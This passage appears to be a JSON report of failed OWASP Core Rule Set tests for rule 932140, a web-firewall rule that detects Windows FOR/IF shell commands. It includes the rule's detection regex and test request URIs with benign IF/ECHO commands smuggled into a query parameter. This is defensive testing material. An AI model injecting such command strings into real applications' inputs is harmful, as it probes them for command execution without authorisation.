          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 97,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 97,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%5B%251%5D%3D%3D%5B%5D+++++++++++++++ECHO+Value+Missing",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 98,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 98,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%5B%251%5D+EQU+%5B%5D++++++++++++ECHO+Value+Missing",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 99,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 99,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%282+GEQ+15%29+++++++++++++echo+%22bigger%22",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 100,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 100,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++red%3D%3Dred+++++++++++++++echo+test",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 101,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942210 - Detects chained SQL injection attempts 1/2", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
